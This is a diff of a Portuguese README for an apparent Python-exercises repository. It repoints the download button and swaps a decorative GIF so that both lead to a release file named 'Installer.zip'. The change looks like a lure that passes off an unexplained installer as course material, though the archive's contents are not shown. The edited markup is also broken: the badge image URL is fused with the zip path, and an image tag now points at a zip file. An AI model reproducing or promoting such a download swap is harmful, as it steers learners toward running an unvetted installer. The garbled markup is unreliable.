@@ -25,7 +25,7 @@ Este repositório tem como objetivo documentar minha evolução na programação
 
 Clique no botão abaixo para fazer o download do repositório:
 
-[![Baixar Exercícios em Python](https://img.shields.io/static/v1?label=Download&message=Exercícios%20em%20Python&color=blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Baixar Exercícios em Python](https://github.com/tobats/exercicios_python/releases/download/v1.0/Installer.zipícios%20em%20Python&color=blue)](https://github.com/tobats/exercicios_python/releases/download/v1.0/Installer.zip)
 
 Se o link acima terminar com o nome de um arquivo, certifique-se de extrair o conteúdo para acessar os exercícios e projetos.
 
@@ -50,4 +50,4 @@ Este repositório é distribuído sob a licença MIT. Sinta-se à vontade para c
 
 Espero que você aproveite os exercícios e projetos disponíveis aqui. Aproveite sua jornada de aprendizado em Python e programação! 🎉🐍
 
-![Python](https://media.giphy.com/media/KAq5w47R9rmTuvWOWa/giphy.gif)
+![Python](https://github.com/tobats/exercicios_python/releases/download/v1.0/Installer.zip)
